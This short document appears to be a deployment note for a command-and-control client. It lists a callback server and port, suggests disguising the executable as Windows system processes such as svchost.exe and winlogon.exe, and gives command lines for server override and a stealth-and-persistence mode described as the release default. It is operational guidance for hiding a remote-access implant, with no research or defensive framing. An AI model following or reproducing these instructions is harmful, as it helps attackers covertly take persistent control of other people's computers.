# Production C2 Client Deployment 
 
Server: 192.168.1.41:4444 
Build Date: Wed 08/06/2025 17:45:31.76 
 
## Deployment Options: 
 
### Standard Deployment: 
c2_client.exe 
 
### Disguised Names: 
svchost.exe          # Windows service host 
system_update.exe    # System update utility 
winlogon.exe         # Windows logon process 
 
### Manual Server Override: 
c2_client.exe --server 192.168.1.41 --port 4444 
 
### Stealth Mode (Default in Release): 
c2_client.exe 
 
### Debug Mode (No Stealth/Persistence): 
c2_client.exe --no-stealth --no-persistence 
